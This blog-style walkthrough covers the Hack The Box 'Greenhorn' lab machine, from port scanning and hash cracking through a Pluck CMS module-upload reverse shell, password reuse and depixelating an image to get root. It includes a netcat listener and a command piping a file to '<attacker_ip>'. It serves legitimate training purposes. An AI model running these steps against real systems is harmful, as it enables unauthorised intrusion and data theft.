🧠 HTB — Greenhorn | Walkthrough & Exploitation Summary

⚔️ Intro

This is my full walkthrough of the Greenhorn CTF challenge on Hack The Box. Rather than giving you a flag-farming script, I’m walking through every step — including rabbit holes, failed attempts, and pivots — because in real-world pentests (and solid CTF runs), methodology > shortcuts.

⚠️ Some parts are intentionally redacted to avoid easy copy-paste flag grabbing. If you’re here just for points, you’re missing the point.

    “Every mistake teaches. Every dead-end maps the path.”

🧭 Phase 1 — Recon & Enumeration

We start with the classic:

nmap -sV -p- -T4 greenhorn.htb

Service versioning reveals a web server, ports 3000, 9999, and a basic admin panel. I added the target IP to /etc/hosts for easier access.

The initial web interface showed a Pluck CMS version — vulnerable according to a quick Google search and ExploitDB lookup.

Found this gem:

    Pluck CMS <= 4.7.18 - Authenticated RCE (CVE-XXXX-YYYY)

Tried launching the exploit, but it required authentication. Time to hunt for creds.
🧩 Phase 2 — Exploring Unusual Ports

Navigating to :3000, we land on what looks like an exposed code repo. Jackpot. After digging into the files, I found a file called pass.php exposing what looks like a SHA-512 password hash.

Saved it locally:

echo "d5443a...790163" > hash.txt
hashcat -m 1700 hash.txt /usr/share/wordlists/rockyou.txt

Boom. Cracked.
🔓 Phase 3 — Exploitation & Shell Access

Used the creds to log into the admin portal. From earlier research, the Pluck version supported module installation, which we could abuse for RCE.

Created a reverse shell PHP payload:

cp reverse.php shell.php
zip shell.zip shell.php

Uploaded via /admin.php?action=installmodule. Setup listener:

nc -lvnp 4444

Shell popped. Initial foothold achieved under www-data.
🔁 Phase 4 — Lateral Movement

Flag access denied — not enough permissions. Inspected /home and found two users: junior and senior.

Tried reused creds from earlier. Access to junior: granted. User flag: captured.
📁 Phase 5 — File Discovery & PrivEsc

Found a PDF file: Using OpenVAS.pdf. Transferred it over:

cat 'Using OpenVAS.pdf' | nc <attacker_ip> 7777

PDF had a pixelated password screenshot. Used depix:

python3 depix.py -p blurred_pass.png -s depix/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o solved.png

Depixelation success. The password unlocked sudo access.

sudo /usr/sbin/openvas

ROOT access obtained. Final flag captured.
🧠 Management Summary

This box was a classic example of weak security practices leading to full compromise:

    ✅ Exposed source code via misconfigured port (:3000)

    ❌ Hardcoded credentials

    ❌ Outdated & vulnerable CMS (Pluck)

    ❌ Password reuse across accounts

    ❌ Storing passwords in pixelated images (weak obfuscation)

By chaining these weaknesses, we moved from unauthenticated recon → web shell → lateral movement → privilege escalation → root.
✅ Final Thoughts

Greenhorn is a great reminder: security is holistic. It’s not just about patching software — it’s about thinking adversarially and minimizing exposure at every layer.
